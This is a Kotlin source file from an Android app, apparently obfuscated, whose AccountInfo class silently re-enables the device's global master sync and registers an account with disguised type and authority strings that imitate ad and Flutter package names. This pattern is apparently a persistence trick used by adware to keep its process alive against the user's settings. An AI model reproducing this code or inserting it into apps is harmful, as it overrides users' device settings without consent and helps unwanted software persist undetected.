package com.sister.smart.kind

import android.accounts.Account
import android.content.ContentResolver
import android.content.Context
import com.sister.blo.SerHelper

/**
 * Date：2025/6/27
 * Describe:
 */
class AccountInfo {
    //SerHelper.c1()
    private val inof = "com.applovie.ad.helper.info"

    //SerHelper.ew()
    private val inofEw = "com.flutter.ii19.pro"

    fun ai(context: Context): Account {
        runCatching {
            if (!ContentResolver.getMasterSyncAutomatically()) {
                ContentResolver.setMasterSyncAutomatically(true)
            }
        }
        val account = Account(SerHelper.r1(context), inof)
        runCatching {
            if (ContentResolver.getIsSyncable(account, inofEw) <= 0) {
                ContentResolver.setIsSyncable(account, inofEw, 1)
            }
        }
        return account
    }

}